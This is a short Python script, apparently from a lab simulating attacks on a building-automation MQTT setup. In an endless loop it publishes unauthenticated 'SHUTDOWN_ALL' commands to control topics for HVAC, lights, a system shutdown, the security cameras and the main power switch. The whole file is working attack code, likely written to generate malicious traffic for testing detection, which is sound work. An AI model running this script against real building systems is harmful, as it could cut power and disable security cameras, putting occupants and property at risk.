import paho.mqtt.client as mqtt
import json
import random
import time
import socket
import os


# Παίρνουμε το όνομα του Pod
pod_id = socket.gethostname()
# Προαιρετικό delay για να μην ξεκινήσουν όλα μαζί
BROKER = os.getenv("BROKER_HOST", "emqx")
delay = int(os.getenv("INITIAL_DELAY", "0"))
time.sleep(delay)
# Δημιουργούμε ένα ID που περιέχει το όνομα του script και το μοναδικό ID του Pod
client = mqtt.Client(client_id=f"Attack_{os.path.basename(__file__)}_{pod_id}")
potential_topics = [
    "building/control/hvac",
    "building/control/lights",
    "building/admin/system/shutdown",
    "building/security/cameras/off",
    "building/sensors/all/reset",
    "building/power/main_switch",
    "building/api/config/update",
]

client.connect("emqx", 1883)
client.loop_start()
# Ο attacker στοχεύει σε topics ελέγχου
while True:
    payload = {"command": "SHUTDOWN_ALL", "auth": "none", "bypass": "true"}
    random_topic = random.choice(potential_topics)
    print(f"Publishing malicious command to random topic...: {random_topic}")
    client.publish(random_topic, json.dumps(payload), qos=1)
    time.sleep(2)
